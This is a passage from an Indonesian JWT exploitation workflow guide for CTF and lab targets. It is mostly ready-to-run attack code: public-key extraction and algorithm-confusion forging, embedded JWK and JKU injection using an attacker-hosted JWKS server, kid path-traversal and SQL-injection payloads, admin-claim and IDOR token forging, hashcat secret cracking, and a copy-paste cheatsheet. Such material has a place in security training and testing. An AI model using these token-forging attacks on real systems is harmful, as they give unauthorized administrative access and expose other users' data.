    cat /tmp/jwks_test.txt | python3 -m json.tool 2>/dev/null || cat /tmp/jwks_test.txt
    cp /tmp/jwks_test.txt ~/jwt_loot/keys/jwks.json
    break
  else
    echo "[-] $ep → $STATUS"
  fi
done
```

**OUTPUT BERHASIL ✅ — JWKS endpoint ditemukan:**

JSON

```
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "primary",
      "use": "sig",
      "alg": "RS256",
      "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2...",
      "e": "AQAB"
    }
  ]
}
```

Bash

```
# Ekstrak public key dari JWKS ke format PEM
python3 << 'EOF'
import json, base64, struct
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

with open('/root/jwt_loot/keys/jwks.json') as f:
    jwks = json.load(f)

key_data = jwks['keys'][0]
n = int.from_bytes(base64.urlsafe_b64decode(key_data['n'] + '=='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(key_data['e'] + '=='), 'big')

public_key = RSAPublicNumbers(e, n).public_key(default_backend())
pem = public_key.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
)

with open('/root/jwt_loot/keys/public.pem', 'wb') as f:
    f.write(pem)

print("[+] Public key extracted to public.pem:")
print(pem.decode())
EOF
```

**OUTPUT GAGAL ❌ — Tidak ada JWKS endpoint:**

text

```
[-] /.well-known/jwks.json → 404
[-] /jwks.json → 404
...
```

➡️ Cari public key di tempat lain:

Bash

```
# Cek source code aplikasi atau halaman web
curl -s $TARGET | grep -i "public.key\|pem\|certificate\|rsa"

# Mungkin di /robots.txt atau sitemap
curl -s $TARGET/robots.txt

# Google search: "<domain> jwks.json" atau "<domain> public key RSA"
```

---

### Langkah 3.2 — Forge Token dengan Public Key sebagai HMAC Secret

Bash

```
# Verifikasi public key tersedia
cat ~/jwt_loot/keys/public.pem

# Forge token menggunakan public key sebagai HMAC secret
python3 << 'EOF'
import jwt

with open('/root/jwt_loot/keys/public.pem', 'rb') as f:
    public_key_bytes = f.read()

# Method 1: Pass raw bytes (paling compatible)
try:
    payload = {"sub": "administrator", "role": "admin"}
    token = jwt.encode(payload, public_key_bytes, algorithm="HS256")
    print(f"[+] Algorithm confusion token (raw bytes):")
    print(token)
except Exception as e:
    print(f"[-] Method 1 failed: {e}")

# Method 2: Pass sebagai string
try:
    payload = {"sub": "administrator", "role": "admin"}
    token = jwt.encode(payload, public_key_bytes.decode(), algorithm="HS256")
    print(f"\n[+] Algorithm confusion token (string):")
    print(token)
except Exception as e:
    print(f"[-] Method 2 failed: {e}")
EOF

# Method 3: jwt_tool (paling reliable untuk ini)
python3 ~/tools/jwt_tool/jwt_tool.py \
  "$JWT" \
  -X k \
  -pk ~/jwt_loot/keys/public.pem
```

**OUTPUT BERHASIL ✅ — Token berhasil dibuat:**

text

```
[+] Algorithm confusion token (raw bytes):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwicm9sZSI6ImFkbWluIn0.XXXXXXXX
```

Bash

```
# Test ke server
export CONFUSION_TOKEN="PASTE_TOKEN_DARI_ATAS"

curl -si \
  -H "Authorization: Bearer $CONFUSION_TOKEN" \
  $TARGET/admin | head -30
```

**OUTPUT BERHASIL ✅ — Admin access via algorithm confusion:**

text

```
HTTP/1.1 200 OK
Admin Panel - Welcome administrator
```

**OUTPUT GAGAL ❌ — Server menolak:**

text

```
HTTP/1.1 401 Unauthorized
{"error": "Algorithm not allowed"}
```

➡️ Server strict tentang algorithm. Coba **Fase 4 (JWK/JKU Injection)** jika RS256.

---

## ═══════════════════════════════════════

## FASE 4: JWK/JKU HEADER INJECTION (RS256)

## ═══════════════════════════════════════

> Buat RSA key pair sendiri, lalu paksa server menggunakan key kita untuk verifikasi.

### Langkah 4.1 — JWK Embedded Attack

Bash

```
# Buat RSA key pair
openssl genrsa -out ~/jwt_loot/keys/attacker_private.pem 2048
openssl rsa -in ~/jwt_loot/keys/attacker_private.pem \
  -pubout -out ~/jwt_loot/keys/attacker_public.pem

echo "[+] Key pair generated"
head -3 ~/jwt_loot/keys/attacker_private.pem
```

Bash

```
# Forge token dengan embedded JWK
python3 << 'EOF'
import jwt, base64, json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

def b64u(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# Load private key
with open('/root/jwt_loot/keys/attacker_private.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None)

# Get public key parameters
public_key = private_key.public_key()
numbers = public_key.public_numbers()

n_bytes = numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, 'big')
e_bytes = numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, 'big')

# Build JWK object
jwk = {
    "kty": "RSA",
    "kid": "attacker-key",
    "use": "sig",
    "alg": "RS256",
    "n": b64u(n_bytes),
    "e": b64u(e_bytes)
}

# Forge token dengan JWK embedded di header
payload = {"sub": "administrator", "role": "admin"}

token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers={
        "kid": "attacker-key",
        "jwk": jwk
    }
)

print("[+] JWK Embedded token:")
print(token)
print("\n[+] JWK yang diembed:")
print(json.dumps(jwk, indent=2))
EOF
```

Bash

```
# Test JWK embedded token
export JWK_TOKEN="PASTE_TOKEN_DARI_ATAS"
curl -si \
  -H "Cookie: session=$JWK_TOKEN" \
  $TARGET/admin | head -20

# Atau dengan jwt_tool
python3 ~/tools/jwt_tool/jwt_tool.py "$JWT" -X i
```

**OUTPUT BERHASIL ✅ — JWK injection berhasil:**

text

```
HTTP/1.1 200 OK
Admin Panel
```

**OUTPUT GAGAL ❌ — JWK injection ditolak:**

text

```
HTTP/1.1 401 Unauthorized
{"error": "Key not trusted"}
```

➡️ Server memvalidasi trusted key. Coba **JKU Attack** di bawah.

---

### Langkah 4.2 — JKU URL Injection Attack

Bash

```
# Buat JWKS file yang akan kita serve
python3 << 'EOF'
import json, base64
from cryptography.hazmat.primitives import serialization

def b64u(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

with open('/root/jwt_loot/keys/attacker_private.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None)

public_key = private_key.public_key()
numbers = public_key.public_numbers()
n_bytes = numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, 'big')
e_bytes = numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, 'big')

jwks = {
    "keys": [{
        "kty": "RSA",
        "kid": "attacker",
        "use": "sig",
        "alg": "RS256",
        "n": b64u(n_bytes),
        "e": b64u(e_bytes)
    }]
}

with open('/root/jwt_loot/jwks.json', 'w') as f:
    json.dump(jwks, f, indent=2)

print("[+] JWKS file created:")
print(json.dumps(jwks, indent=2))
EOF

# Serve JWKS file (terminal 1)
echo "[*] Serving JWKS di http://$LHOST:8000/jwks.json"
cd ~/jwt_loot && python3 -m http.server 8000 &
JWKS_PID=$!
sleep 1

# Verifikasi accessible
curl -s "http://$LHOST:8000/jwks.json" | head -5
```

Bash

```
# Forge token dengan jku mengarah ke server kita
python3 << EOF
import jwt
from cryptography.hazmat.primitives import serialization

with open('/root/jwt_loot/keys/attacker_private.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None)

payload = {"sub": "administrator", "role": "admin"}

token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers={
        "kid": "attacker",
        "jku": "http://$LHOST:8000/jwks.json"
    }
)

print("[+] JKU injection token:")
print(token)
EOF

# Test ke server
export JKU_TOKEN="PASTE_TOKEN"
curl -si \
  -H "Cookie: session=$JKU_TOKEN" \
  $TARGET/admin

# Cek apakah server fetch JWKS kita
# Lihat terminal JWKS server untuk request masuk
```

**OUTPUT BERHASIL ✅ — JKU attack berhasil (lihat di JWKS server):**

text

```
# Di terminal JWKS server:
10.10.11.200 - - "GET /jwks.json HTTP/1.1" 200 -

# Di curl ke admin:
HTTP/1.1 200 OK
Admin Panel
```

**OUTPUT GAGAL ❌ — Target tidak bisa reach JWKS server:**

text

```
# Tidak ada request di JWKS server log
# Dan:
HTTP/1.1 401 Unauthorized
```

➡️ Firewall blokir outbound request. Cek apakah target bisa ping balik:

Bash

```
# Test dengan Burp Collaborator atau ngrok sebagai alternatif
# Jika target CTF, biasanya VPN tun0 bisa diakses
ping -c 1 $TARGET  # Check apakah kita bisa reach target
```

---

### Langkah 4.3 — KID Injection (Path Traversal & SQLi)

Bash

```
# Test jika header JWT punya field 'kid'
# Cek dari decode Fase 0 apakah ada kid

# Method A: kid Path Traversal (point ke /dev/null → empty secret)
python3 << 'EOF'
import jwt

# Sign dengan empty string sebagai secret (isi /dev/null = empty)
payload = {"sub": "administrator", "role": "admin"}

for kid_path in [
    "../../../../../../../dev/null",
    "../../../../dev/null",
    "../../dev/null",
    "/dev/null",
    "../../../../../../../../../../dev/null"
]:
    try:
        token = jwt.encode(
            payload,
            "",  # empty secret = isi /dev/null
            algorithm="HS256",
            headers={"kid": kid_path}
        )
        print(f"kid={kid_path[:30]}...")
        print(f"  Token: {token[:80]}...")
        print()
    except Exception as e:
        print(f"Error: {e}")
EOF
```

Bash

```
# Test setiap token
python3 << 'EOF'
import jwt, subprocess, os

payload = {"sub": "administrator", "role": "admin"}
target = os.environ.get('TARGET', 'http://10.10.11.200')

for kid_path in ["../../../../../../../dev/null", "../../../../dev/null"]:
    token = jwt.encode(
        payload, "",
        algorithm="HS256",
        headers={"kid": kid_path}
    )
    
    result = subprocess.run(
        ['curl', '-si', '-H', f'Cookie: session={token}',
         f'{target}/admin'],
        capture_output=True, text=True
    )
    
    status = [l for l in result.stdout.split('\n') if l.startswith('HTTP')]
    print(f"kid={kid_path[:30]}... → {status[0] if status else 'No response'}")
EOF
```

**OUTPUT BERHASIL ✅ — KID path traversal berhasil:**

text

```
kid=../../../../../../../dev/null → HTTP/1.1 200 OK
```

Bash

```
# Method B: kid SQL Injection
python3 << 'EOF'
import jwt

# SQL injection payloads untuk kid field
sqli_payloads = [
    "' UNION SELECT 'mysecret'--",
    "1' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "') UNION SELECT 'secret'--"
]

payload = {"sub": "administrator", "role": "admin"}

for sqli in sqli_payloads:
    for secret in ["mysecret", "secret", "", "null", "admin"]:
        try:
            token = jwt.encode(
                payload, secret,
                algorithm="HS256",
                headers={"kid": sqli}
            )
            print(f"kid={sqli[:30]}, secret='{secret}': {token[:60]}...")
        except:
            pass
EOF
```

---

## ═══════════════════════════════════════

## FASE 5: CLAIM VERIFICATION BYPASS

## ═══════════════════════════════════════

> Jika sudah bisa forge token (dapat secret atau bypass signature), test semua claim yang bisa dimanipulasi.

### Langkah 5.1 — Test Expiry Validation

Bash

```
# Test 1: Token tanpa field exp
python3 << EOF
import jwt

SECRET = "${JWT_SECRET:-secret}"  # Ganti dengan secret yang ditemukan

# Token tanpa exp
token_no_exp = jwt.encode(
    {"sub": "wiener", "role": "user"},
    SECRET, algorithm="HS256"
)

# Token dengan exp di masa lalu (expired)
token_expired = jwt.encode(
    {"sub": "wiener", "role": "user", "exp": 1000000000},  # Tahun 2001
    SECRET, algorithm="HS256"
)

# Token dengan exp di masa depan jauh
token_future = jwt.encode(
    {"sub": "administrator", "role": "admin", "exp": 9999999999},
    SECRET, algorithm="HS256"
)

print(f"No exp: {token_no_exp[:60]}...")
print(f"Expired: {token_expired[:60]}...")
print(f"Future: {token_future[:60]}...")
EOF

# Test masing-masing
curl -si -H "Cookie: session=TOKEN_NO_EXP" $TARGET/my-account | head -5
curl -si -H "Cookie: session=TOKEN_EXPIRED" $TARGET/my-account | head -5
```

**OUTPUT BERHASIL ✅ — Expired token diterima:**

text

```
HTTP/1.1 200 OK
```

➡️ Server tidak validasi `exp`! Ini vulnerability tersendiri.

---

### Langkah 5.2 — Test Audience dan Issuer Validation

Bash

```
python3 << EOF
import jwt

SECRET = "${JWT_SECRET:-secret}"

# Test aud manipulation
for aud in ["admin", "api", "internal", "web-app", None]:
    payload = {"sub": "administrator", "role": "admin"}
    if aud:
        payload["aud"] = aud
    
    token = jwt.encode(payload, SECRET, algorithm="HS256")
    print(f"aud={aud}: {token[:60]}...")

# Test iss manipulation  
for iss in ["admin", "internal", "trusted-service", None]:
    payload = {"sub": "administrator", "role": "admin"}
    if iss:
        payload["iss"] = iss
    
    token = jwt.encode(payload, SECRET, algorithm="HS256")
    print(f"iss={iss}: {token[:60]}...")
EOF
```

---

## ═══════════════════════════════════════

## FASE 6: CLAIM MANIPULATION (FORGE FINAL TOKEN)

## ═══════════════════════════════════════

> Setelah bisa membuat token valid (dari Fase 1-4), manipulasi semua claim security-sensitive.

### Langkah 6.1 — Privilege Escalation via Role Manipulation

Bash

```
# Forge admin token dengan semua kemungkinan role claim
python3 << EOF
import jwt, time

SECRET = "${JWT_SECRET:-secret}"
ALG = "HS256"

# Kemungkinan struktur payload admin
admin_payloads = [
    {"sub": "administrator", "role": "admin"},
    {"sub": "administrator", "role": "Admin"},
    {"sub": "administrator", "role": "ADMIN"},
    {"sub": "administrator", "is_admin": True},
    {"sub": "administrator", "is_admin": 1},
    {"sub": "administrator", "admin": True},
    {"sub": "administrator", "role": "admin", "is_admin": True},
    {"sub": "administrator", "permissions": ["admin", "read", "write"]},
    {"sub": "admin", "role": "admin"},
    {"username": "administrator", "role": "admin"},
]

for payload in admin_payloads:
    payload["iat"] = int(time.time())
    token = jwt.encode(payload, SECRET, algorithm=ALG)
    print(f"Payload: {payload}")
    print(f"Token: {token[:80]}...")
    print()
EOF

# Test semua token ke admin endpoint
# Catat mana yang return 200
```

Bash

```
# Script otomatis test semua variasi
python3 << EOF
import jwt, time, subprocess, os

SECRET = os.environ.get('JWT_SECRET', 'secret')
TARGET = os.environ.get('TARGET', 'http://10.10.11.200')
ALG = "HS256"

test_cases = [
    ({"sub": "administrator", "role": "admin"}, "role=admin"),
    ({"sub": "administrator", "is_admin": True}, "is_admin=True"),
    ({"sub": "admin", "role": "admin"}, "sub=admin+role=admin"),
    ({"sub": "administrator", "role": "administrator"}, "role=administrator"),
]

print("[*] Testing claim variations...")
for payload, desc in test_cases:
    payload["iat"] = int(time.time())
    token = jwt.encode(payload, SECRET, algorithm=ALG)
    
    result = subprocess.run(
        ['curl', '-so', '/dev/null', '-w', '%{http_code}',
         '-H', f'Cookie: session={token}',
         f'{TARGET}/admin'],
        capture_output=True, text=True
    )
    
    print(f"{desc} → HTTP {result.stdout}")
    if result.stdout == "200":
        print(f"  [+] SUCCESS! Token: {token}")
        with open('/root/jwt_loot/evidence/working_admin_token.txt', 'w') as f:
            f.write(token)
EOF
```

**OUTPUT BERHASIL ✅ — Admin access:**

text

```
role=admin → HTTP 200
  [+] SUCCESS! Token: eyJhbGc...
```

---

### Langkah 6.2 — User ID Manipulation (JWT + IDOR)

Bash

```
# Jika JWT mengandung user ID, test IDOR via JWT claim manipulation
python3 << EOF
import jwt, time

SECRET = "${JWT_SECRET:-secret}"

# Dapatkan payload original untuk tahu struktur
original_payload = jwt.decode("$JWT", SECRET, algorithms=["HS256"])
print(f"[*] Original payload: {original_payload}")

# Identify field yang mungkin user ID
id_fields = ["sub", "user_id", "uid", "id", "userId"]

for field in id_fields:
    if field in original_payload:
        print(f"\n[+] Found ID field: {field} = {original_payload[field]}")
        
        # Forge token dengan ID berbeda
        for target_id in ["1", "2", "100", "101", "admin", "0"]:
            payload = original_payload.copy()
            payload[field] = target_id
            payload["iat"] = int(time.time())
            token = jwt.encode(payload, SECRET, algorithm="HS256")
            print(f"  {field}={target_id}: {token[:60]}...")
EOF

# Test IDOR via JWT
# Ganti ID dan akses profile orang lain
for ID in "1" "2" "100" "101"; do
  TOKEN=$(python3 -c "
import jwt, time
secret='${JWT_SECRET:-secret}'
payload={'sub': '$ID', 'role': 'user', 'iat': int(time.time())}
print(jwt.encode(payload, secret, algorithm='HS256'))
")
  STATUS=$(curl -so /tmp/idor_test.txt -w "%{http_code}" \
    -H "Cookie: session=$TOKEN" \
    "$TARGET/api/users/$ID")
  echo "sub=$ID → HTTP $STATUS"
  if [[ "$STATUS" == "200" ]]; then
    echo "  Data: $(cat /tmp/idor_test.txt | head -50)"
  fi
done
```

---

## ═══════════════════════════════════════

## FASE 7: TOKEN REPLAY & INFORMATION DISCLOSURE

## ═══════════════════════════════════════

### Langkah 7.1 — Token Replay Attack

Bash

```
# Test: Apakah token masih valid setelah logout?
# Step 1: Login dan simpan token
curl -si -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"wiener","password":"peter"}' \
  $TARGET/login | grep -i "set-cookie\|access_token" | tee /tmp/pre_logout_token.txt

export REPLAY_TOKEN=$(grep -Eo 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' /tmp/pre_logout_token.txt | head -1)

# Step 2: Logout
curl -si -X POST \
  -H "Cookie: session=$REPLAY_TOKEN" \
  $TARGET/logout

# Step 3: Replay token setelah logout
sleep 2
STATUS=$(curl -so /dev/null -w "%{http_code}" \
  -H "Cookie: session=$REPLAY_TOKEN" \
  $TARGET/my-account)
echo "[*] Replay after logout: HTTP $STATUS"

# Step 4: Test dengan expired token
EXPIRED_TOKEN=$(python3 -c "
import jwt
try:
    payload = jwt.decode('$REPLAY_TOKEN', options={'verify_signature': False, 'verify_exp': False})
    payload['exp'] = 1000000  # tahun 2001
    import time; payload['iat'] = int(time.time())
    # Note: tanpa secret kita tidak bisa resign, tapi bisa test server behavior
    print('Cannot resign without secret, use original expired token')
except Exception as e:
    print(f'Error: {e}')
")
```

**OUTPUT BERHASIL ✅ — Token masih valid setelah logout:**

text

```
[*] Replay after logout: HTTP 200
```

➡️ **Missing token revocation** — ini vulnerability! Catat sebagai finding.

---

### Langkah 7.2 — JWT Information Disclosure

Bash

```
# Decode semua JWT yang ditemukan dan extract sensitive info
python3 << 'EOF'
import base64, json, os, glob

def b64d(s):
    s += "=" * (-len(s) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(s))
    except:
        return None

# Temukan semua token
token_files = glob.glob('/root/jwt_loot/tokens/*.jwt')

sensitive_fields = [
    'email', 'username', 'phone', 'address', 'role',
    'is_admin', 'permissions', 'department', 'internal_id',
    'tenant_id', 'org_id', 'secret', 'password', 'api_key',
    'private', 'internal', 'employee_id', 'salary', 'ssn'
]

for tf in token_files:
    with open(tf) as f:
        jwt = f.read().strip()
    
    parts = jwt.split('.')
    if len(parts) != 3:
        continue
    
    payload = b64d(parts[1])
    if not payload:
        continue
    
    print(f"\n[*] Token: {os.path.basename(tf)}")
    print(f"[*] All claims: {json.dumps(payload, indent=2)}")
    
    found_sensitive = {k: v for k, v in payload.items() if k.lower() in sensitive_fields}
    if found_sensitive:
        print(f"[!] SENSITIVE FIELDS: {found_sensitive}")
EOF
```

**OUTPUT BERHASIL ✅ — Sensitive data di payload:**

text

```
[!] SENSITIVE FIELDS: {
  'email': 'wiener@normal-user.net',
  'role': 'user',
  'department': 'finance',
  'internal_id': 'EMP-0091'
}
```

➡️ Data sensitif di payload JWT bisa dibaca siapapun! Ini information disclosure vulnerability.

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`InvalidSignatureError`|Secret salah|Crack dulu dengan hashcat|
|`ExpiredSignatureError`|Token expired|Buat token baru atau test server verify exp|
|`Algorithm not supported`|Server strict whitelist|Test algorithm lain yang diterima|
|`alg=none` ditolak|Server blokir|Skip ke weak secret atau confusion|
|hashcat "token separator error"|JWT tidak lengkap|Pastikan simpan full 3-part JWT|
|jwt_tool flag tidak dikenal|Versi berbeda|Jalankan `python3 jwt_tool.py -h`|
|JKU callback tidak masuk|Firewall egress|Cek VPN/tun0 routing ke LHOST|
|JWK injection ditolak|Server validate key provenance|Coba JKU attack sebagai gantinya|
|Algorithm confusion gagal|Server restrict to RS256 only|Coba JWK/JKU injection|
|`InvalidKeyError` pada HS256|PyJWT block PEM as HMAC|Gunakan `public_key_bytes` bukan PEM object|
|`aud` mismatch error|Audience validation aktif|Preserve audience dari original token|
|`iss` mismatch error|Issuer validation aktif|Preserve issuer dari original token|
|Token valid tapi admin 403|Claim bukan authoritative|Cari server-side role mapping|
|Secret cracked tapi forge gagal|Wrong algorithm|Pastikan encode dengan algorithm sama|

**Google search ketika buntu:**

text

```
# Untuk error spesifik:
"JWT <error_message> site:stackoverflow.com"
"jwt_tool <attack_name> usage 2024"
"hashcat 16500 JWT crack wordlist"
"PyJWT RS256 to HS256 confusion python"

# Untuk CTF/HTB:
"<box_name> JWT HackTheBox writeup"
"JWT algorithm confusion portswigger lab solution"
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: JWT Ditemukan
│
├─ FASE 0: Decode & Identify
│   ├─ alg = HS256/384/512 → Path A
│   ├─ alg = RS256/384/512 → Path B  
│   └─ alg = none          → FORGE LANGSUNG!
│
├─ PATH A (HMAC):
│   ├─ FASE 1: Test unverified signature
│   │   └─ [Server tidak verif] → Forge sesuka hati → DONE
│   ├─ FASE 1: Test alg=none variants
│   │   └─ [none diterima] → Forge admin token → DONE
│   └─ FASE 2: Crack secret
│       ├─ [Secret found] → Forge any claim → DONE
│       └─ [Not found] → Coba wordlist lebih besar
│
├─ PATH B (RSA/ECDSA):
│   ├─ FASE 1: Test alg=none
│   ├─ FASE 3: Algorithm confusion (butuh public key)
│   │   └─ [Diterima] → DONE
│   ├─ FASE 4A: JWK embedding
│   │   └─ [Diterima] → DONE
│   ├─ FASE 4B: JKU injection (butuh outbound reach)
│   │   └─ [Server fetch JWKS kita] → DONE
│   └─ FASE 4C: KID manipulation
│       ├─ [Path traversal → /dev/null] → DONE
│       └─ [SQL injection] → DONE
│
└─ FASE 6: Claim Manipulation (setelah dapat signature bypass)
    ├─ role/is_admin → Privilege escalation
    ├─ sub/user_id → IDOR → <a href="/docs/idor-access-control" class="text-[#00b4d8] hover:underline font-mono font-semibold">27_idor_access_control_workflow.md</a>
    └─ exp/aud/iss → Replay/scope expansion
```

---

## Cross-Service / Cross-Workflow Reference

text

```
JWT Findings
     │
     ├─ ─→ JWT sub/user_id manipulation → <a href="/docs/idor-access-control" class="text-[#00b4d8] hover:underline font-mono font-semibold">27_idor_access_control_workflow.md</a>
     ├──→ JWT role=admin → Admin panel access
     ├──→ Admin panel → File upload → <a href="/docs/file-upload" class="text-[#00b4d8] hover:underline font-mono font-semibold">25_file_upload_workflow.md</a>
     ├──→ Admin panel → SSRF → <a href="/docs/ssrf" class="text-[#00b4d8] hover:underline font-mono font-semibold">22_ssrf_workflow.md</a>
     ├──→ JKU SSRF-like callback → <a href="/docs/ssrf" class="text-[#00b4d8] hover:underline font-mono font-semibold">22_ssrf_workflow.md</a>
     ├──→ KID SQLi → <a href="/docs/sql-injection" class="text-[#00b4d8] hover:underline font-mono font-semibold">19_sql_injection_workflow.md</a>
     ├──→ OAuth/SSO token → <a href="/docs/oauth-sso" class="text-[#00b4d8] hover:underline font-mono font-semibold">34_oauth_sso_workflow.md</a>
     └──→ API access → <a href="/docs/api-security" class="text-[#00b4d8] hover:underline font-mono font-semibold">30_api_security_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export JWT="eyJ..."  # Ganti dengan token aktual
export TARGET="http://10.10.11.200"
export JWT_SECRET=""  # Isi setelah ditemukan
mkdir -p ~/jwt_loot/{tokens,keys,scripts,evidence}

# === DECODE ===
python3 -c "
import base64,json
t='$JWT'
p=t.split('.')
def d(s): s+='='*(-len(s)%4); return json.loads(base64.urlsafe_b64decode(s))
print('Header:',json.dumps(d(p[0]),indent=2))
print('Payload:',json.dumps(d(p[1]),indent=2))
"

# === NONE ALGORITHM ===
python3 -c "
import base64,json
def b(x): return base64.urlsafe_b64encode(json.dumps(x,separators=(',',':')).encode()).rstrip(b'=').decode()
for alg in ['none','None','NONE','nOnE']:
    h=b({'alg':alg,'typ':'JWT'}); p=b({'sub':'administrator','role':'admin'})
    print(f'{alg}: {h}.{p}.')
"

# === CRACK SECRET ===
echo "$JWT" > /tmp/jwt.txt
hashcat -a 0 -m 16500 /tmp/jwt.txt ~/jwt_loot/jwt_secrets.txt
hashcat -a 0 -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt

# === FORGE HS256 ===
python3 -c "
import jwt
token = jwt.encode({'sub':'administrator','role':'admin'}, '$JWT_SECRET', algorithm='HS256')
print(token)
"

# === ALGORITHM CONFUSION ===
python3 ~/tools/jwt_tool/jwt_tool.py "$JWT" -X k -pk ~/jwt_loot/keys/public.pem

# === JWK EMBEDDED ===
python3 ~/tools/jwt_tool/jwt_tool.py "$JWT" -X i

# === JKU INJECTION ===
python3 -m http.server 8000 &  # Serve jwks.json
python3 ~/tools/jwt_tool/jwt_tool.py "$JWT" -X s -ju "http://$LHOST:8000/jwks.json"

# === KID PATH TRAVERSAL ===
python3 -c "
import jwt
token = jwt.encode({'sub':'administrator','role':'admin'}, '', algorithm='HS256',
    headers={'kid':'../../../../../../../dev/null'})
print(token)
"

# === TEST TOKEN ===
curl -si -H "Cookie: session=TOKEN" $TARGET/admin | head -5
curl -si -H "Authorization: Bearer TOKEN" $TARGET/admin | head -5

# === QUICK FULL SCAN ===
python3 ~/tools/jwt_tool/jwt_tool.py "$JWT" \
  -t $TARGET \
  -rc "session=$JWT" \
  -M pb
```

---

> **➡️ NEXT:** Setelah JWT berhasil dieksploitasi dan dapat akses admin, lanjut ke **[🛡️ 29 — CSRF Workflow](/docs/csrf)** untuk test CSRF di admin panel, atau jika menemukan API endpoints → **`<a href="/docs/api-security" class="text-[#00b4d8] hover:underline font-mono font-semibold">30_api_security_workflow.md</a>`**. Jika sub/user_id bisa dimanipulasi → **`<a href="/docs/idor-access-control" class="text-[#00b4d8] hover:underline font-mono font-semibold">27_idor_access_control_workflow.md</a>`**.